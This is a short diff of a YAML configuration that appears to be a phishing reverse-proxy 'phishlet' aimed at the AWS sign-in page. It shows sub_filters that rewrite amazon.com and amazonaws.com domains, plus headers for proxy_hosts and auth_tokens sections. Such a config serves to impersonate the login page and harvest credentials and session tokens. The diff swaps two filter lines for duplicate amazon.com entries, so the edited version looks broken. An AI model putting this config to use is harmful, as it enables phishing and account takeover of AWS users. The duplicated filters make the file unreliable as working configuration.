@@ -33,8 +33,8 @@ proxy_hosts:
 sub_filters:
   - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'amazonaws.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'awsstatic.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'cloudfront.net', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: '', domain: 'amazon.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 
 auth_tokens:
